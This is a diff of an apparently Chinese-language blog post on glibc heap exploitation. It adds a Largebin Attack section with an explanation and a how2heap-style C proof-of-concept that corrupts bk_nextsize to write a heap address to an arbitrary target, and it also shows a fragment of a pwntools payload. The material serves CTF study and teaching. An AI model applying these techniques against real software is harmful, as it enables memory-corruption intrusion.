@@ -24,13 +24,67 @@ title: GLIBC - exploitation-in-latest-glibc-0x00 基本思路
 >
 > - 在没有泄漏的情况下通过双重异或盲绕过 tcache 异或保护 - [safe link double protect](https://github.com/shellphish/how2heap/blob/master/glibc_2.36/safe_link_double_protect.c)
 > - 在没有泄漏的情况下把 libc 相关地址放入 tcache 中 - [House of Water](https://github.com/shellphish/how2heap/blob/master/glibc_2.36/house_of_water.c)
-> - 没有显示 free 时的现代版 House of Orange - [House of Tangerine](https://github.com/shellphish/how2heap/blob/master/glibc_2.39/house_of_tangerine.c)
+> - 没有显式 free 情况下的现代版 House of Orange - [House of Tangerine](https://github.com/shellphish/how2heap/blob/master/glibc_2.39/house_of_tangerine.c)
 > - 让 tcache double free 再次伟大 - [House of Botcake](https://github.com/shellphish/how2heap/blob/master/glibc_2.35/house_of_botcake.c)
 >
 > 各种花里胡哨的利用方法也在持续更新，可以一直关注 [how2heap](https://github.com/shellphish/how2heap)，甚至还提供了网页端调试器，非常好 cheatsheet❤️
 
 ## Largebin Attack
 
+Largebin Attack 利用手段自 glibc 2.23 起一直存在，近期 IO 相关利用丰富起来后重新变得热门。
+
+> [!NOTE] 
+> 古早时期的 Unsortedbin Attack 效果与 Largebin Attack 类似，都是向任意地址写入一个值，通常被用于赋写 `mp_.tcache_bins` 或者 `global_max_fast` 为一个大数，进而打更容易利用的 tcache / fastbin 完成攻击。
+>
+> 但是现在 Unsortedbin Attack 已经不再可行，取而代之的是条件更加严苛的 Largebin Attack，不过后者还可以确定写入的是指定堆块的地址，这也带来了一些 data-only attack 的机会，例如赋写 `_IO_list_all` 为堆块地址，并在其中伪造 `_IO_FILE_plus` 结构体用 House of Apple2 劫持控制流。
+
+```c
+/*
+A revisit to large bin attack for after glibc2.30
+
+Relevant code snippet :
+
+	if ((unsigned long) (size) < (unsigned long) chunksize_nomask (bck->bk)){
+		fwd = bck;
+		bck = bck->bk;
+		victim->fd_nextsize = fwd->fd;
+		victim->bk_nextsize = fwd->fd->bk_nextsize;
+		fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim; // 任意写效果：伪造的 bk_nextsize
+	}
+*/
+
+int main(){
+  printf("Since glibc2.30, two new checks have been enforced on large bin chunk insertion\n\n");
+  printf("Check 1 : \n");
+  printf(">    if (__glibc_unlikely (fwd->bk_nextsize->fd_nextsize != fwd))\n");
+  printf(">        malloc_printerr (\"malloc(): largebin double linked list corrupted (nextsize)\");\n");
+  printf("Check 2 : \n");
+  printf(">    if (bck->fd != fwd)\n");
+  printf(">        malloc_printerr (\"malloc(): largebin double linked list corrupted (bk)\");\n\n");
+  printf("This prevents the traditional large bin attack\n");
+  printf("However, there is still one possible path to trigger large bin attack. The PoC is shown below : \n\n");
+
+  size_t target = 0;
+  size_t *p1 = malloc(0x428);
+  size_t *g1 = malloc(0x18);
+  size_t *p2 = malloc(0x418);
+  size_t *g2 = malloc(0x18);
+  free(p1);
+  printf("Free the larger of the two --> [p1] (%p)\n",p1-2);
+  size_t *g3 = malloc(0x438);
+  printf("Allocate a chunk larger than [p1] to insert [p1] into large bin\n");
+
+  printf("\n");
+
+  free(p2);
+
+  p1[3] = (size_t)((&target)-4);
+
+  size_t *g4 = malloc(0x438);
+  assert((size_t)(p2-2) == target);
+  return 0;
+}
+```
 
 ## Apple2 板子
 
@@ -113,6 +167,3 @@ payload = flat(
 )
 edit(0, payload)
 ```
-
-
-
